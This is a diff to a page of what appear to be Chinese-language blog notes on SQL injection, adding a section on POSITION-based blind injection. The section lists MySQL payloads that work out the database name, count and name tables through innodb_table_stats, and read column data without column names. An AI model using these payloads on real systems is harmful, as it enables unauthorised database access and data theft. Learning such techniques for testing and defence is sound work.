@@ -92,7 +92,7 @@
                 
                 <span class="tag">
                     
-                    <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" style="color: #ffa2c4">
+                    <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" style="color: #03a9f4">
                         知识点
                     </a>
                 </span>
@@ -103,6 +103,7 @@
         
         <p>REGEXP注入</p>
 <p>LIKE注入</p>
+<p>POSITION盲注</p>
 <span id="more"></span>
 
 <h1 id="REGEXP注入"><a href="#REGEXP注入" class="headerlink" title="REGEXP注入"></a>REGEXP注入</h1><p>regexp注入即正则表达式注入，也叫盲注值正则表达式攻击</p>
@@ -152,11 +153,27 @@ database若是s开头，则返回1
 </blockquote>
 <pre><code class="sql">select 1,database() like &#39;s----&#39;#
 </code></pre>
+<h1 id="POSITION盲注"><a href="#POSITION盲注" class="headerlink" title="POSITION盲注"></a>POSITION盲注</h1><p>不使用where进行判断，使用postion代替ascii进行字符的判断</p>
+<p>需要注意字母的大小写</p>
+<pre><code class="sql">SELECT * from one WHERE id = 2 and LENGTH((SELECT database()))=5 # 数据库长度
+
+SELECT * from one WHERE id = 2 and POSITION(&#39;a&#39; IN database()) # 数据库含有的文字，得出数据库名
+ 
+SELECT * from one WHERE id = 2 and POSITION(&quot;5&quot; IN (SELECT COUNT(t.table_name) FROM mysql.innodb_table_stats t JOIN (SELECT &#39;basic&#39; AS database_name) AS f ON t.database_name = f.database_name)) # 数据库中表的数量
+
+SELECT * from one WHERE id = 2 and POSITION(&quot;a&quot; IN (SELECT group_concat(t.table_name) FROM mysql.innodb_table_stats t JOIN (SELECT &#39;basic&#39; AS database_name) AS f ON t.database_name = f.database_name)) # 爆破表名称
+
+SELECT * from one WHERE id = 2 and POSITION(5 IN (SELECT count(*) from one)) # 表中字段数量
+
+SELECT * from one WHERE id = 2 and POSITION(5 IN (SELECT group_concat(`2`) from (SELECT 1,2 union select * from one)a)) # 无列名获取字段内容
+
+SELECT * from one WHERE id = 2 and POSITION(5 IN (SELECT REVERSE(group_concat(`2`)) from (SELECT 1,2 union select * from one)a))
+</code></pre>
 
         <div class="content" v-pre>
             <!-- 
     <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#REGEXP%E6%B3%A8%E5%85%A5"><span class="toc-text">REGEXP注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E5%8F%A5"><span class="toc-text">语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E5%8F%A5-1"><span class="toc-text">语句</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#REGEXP%E6%B3%A8%E5%85%A5"><span class="toc-text">REGEXP注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E5%8F%A5"><span class="toc-text">语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E5%8F%A5-1"><span class="toc-text">语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POSITION%E7%9B%B2%E6%B3%A8"><span class="toc-text">POSITION盲注</span></a></li></ol>
     </div>
  -->
         </div>
